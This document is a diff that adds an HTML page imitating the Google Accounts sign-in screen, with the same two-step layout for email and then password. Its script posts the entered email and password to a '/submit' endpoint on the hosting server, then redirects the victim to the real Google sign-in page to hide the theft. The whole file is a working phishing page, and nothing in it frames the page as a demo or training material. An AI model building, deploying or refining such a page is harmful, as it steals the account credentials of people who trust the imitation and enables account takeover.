@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root { --google-blue: #1a73e8; --text-dark: #202124; --text-gray: #5f6368; --border-gray: #dadce0; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
+        body { background-color: #fff; display: flex; flex-direction: column; min-height: 100vh; padding: 0 24px; }
+        .content-wrapper { max-width: 450px; margin: 0 auto; width: 100%; padding-top: 48px; }
+        .google-logo { width: 48px; margin-bottom: 24px; }
+        h1 { font-size: 28px; font-weight: 400; color: var(--text-dark); margin-bottom: 8px; }
+        .subtitle { font-size: 16px; color: var(--text-dark); margin-bottom: 32px; }
+        .user-chip { display: inline-flex; align-items: center; padding: 3px 12px 3px 4px; border: 1px solid var(--border-gray); border-radius: 20px; margin-bottom: 30px; cursor: pointer; }
+        .user-chip .avatar { width: 20px; height: 20px; background: #5f6368; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; margin-right: 8px; }
+        .input-box { position: relative; width: 100%; margin-bottom: 8px; }
+        input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid var(--border-gray); border-radius: 4px; outline: none; width: 100%; }
+        input:focus { border: 2px solid var(--google-blue); padding: 12px 14px; }
+        .label-text { position: absolute; left: 12px; top: -10px; background: white; padding: 0 4px; font-size: 12px; color: var(--google-blue); }
+        .blue-link { color: var(--google-blue); text-decoration: none; font-weight: 500; font-size: 14px; cursor: pointer; }
+        .footer-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .btn-next { background-color: var(--google-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 24px; font-weight: 500; cursor: pointer; }
+        .hidden { display: none; }
+        .bottom-nav { margin-top: auto; padding: 24px 0; display: flex; justify-content: space-between; font-size: 12px; color: var(--text-gray); }
+    </style>
+</head>
+<body>
+    <div class="content-wrapper">
+        <img src="https://image2url.com/images/1766411607576-d8e03a81-2e44-44f5-8ecc-b7b4b1418abb.png" class="google-logo">
+        <div id="step-1">
+            <h1>Sign in</h1>
+            <p class="subtitle">Use your Google Account</p>
+            <div class="input-box">
+                <span class="label-text">Email or phone</span>
+                <input type="email" id="email-input">
+            </div>
+            <div class="footer-actions">
+                <a class="blue-link">Create account</a>
+                <button class="btn-next" onclick="toStep2()">Next</button>
+            </div>
+        </div>
+        <div id="step-2" class="hidden">
+            <h1>Welcome</h1>
+            <div class="user-chip" onclick="toStep1()">
+                <div class="avatar">👤</div>
+                <span id="display-email"></span>
+            </div>
+            <div class="input-box">
+                <span class="label-text">Enter your password</span>
+                <input type="password" id="password-input">
+            </div>
+            <div class="footer-actions">
+                <a class="blue-link">Forgot password?</a>
+                <button class="btn-next" onclick="sendData()">Next</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        function toStep2() {
+            const email = document.getElementById('email-input').value;
+            if(email) {
+                document.getElementById('display-email').innerText = email;
+                document.getElementById('step-1').classList.add('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
+            }
+        }
+        function toStep1() {
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-1').classList.remove('hidden');
+        }
+        async function sendData() {
+            const email = document.getElementById('email-input').value;
+            const password = document.getElementById('password-input').value;
+            await fetch('/submit', {
+                method: 'POST',
+                body: JSON.stringify({ email, password })
+            });
+            window.location.href = "https://accounts.google.com";
+        }
+    </script>
+</body>
+</html>
